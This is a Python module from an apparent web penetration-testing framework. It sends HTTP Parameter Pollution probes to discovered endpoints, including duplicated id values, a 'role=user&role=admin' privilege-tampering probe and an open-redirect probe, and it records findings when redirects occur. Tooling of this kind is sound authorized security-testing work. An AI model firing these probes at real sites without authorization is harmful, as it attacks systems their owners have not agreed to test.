from __future__ import annotations
from core.module import ExploitModule
from core.models import ExploitResult
class HPPModule(ExploitModule):
    name="HTTP Parameter Pollution"; category="protocol"
    async def run(self,ctx):
        evidence=[]
        for endpoint in ctx.artifacts.get("recon.endpoints",[])[:50]:
            sep='&' if '?' in endpoint else '?'
            probes=[endpoint+sep+'id=1&id=2', endpoint+sep+'role=user&role=admin', endpoint+sep+'next=/%26next=https://example.com/']
            for i,probe in enumerate(probes,1):
                ctx.logger(f"[payload {i}/{len(probes)}] HTTP Parameter Pollution")
                try:
                    r=await ctx.http.request('GET',probe)
                    evidence.append(f"{probe} -> {r.status_code}, {len(r.text)} bytes")
                    if r.status_code in (300,301,302,303,307,308) and r.headers.get("location"):
                        ctx.add_finding(probe, probe.split("?",1)[-1], self.name, f"HTTP {r.status_code}; duplicate parameters altered redirect behavior", confidence="medium")
                        return ExploitResult(self.name, "signal", "Potential HTTP Parameter Pollution behavior observed", evidence=probe)
                except Exception as exc:evidence.append(str(exc))
        return ExploitResult(self.name,'signal' if ctx.artifacts.get('hpp.hit') else 'no-signal','HPP probes completed',evidence='\n'.join(evidence[:20]))
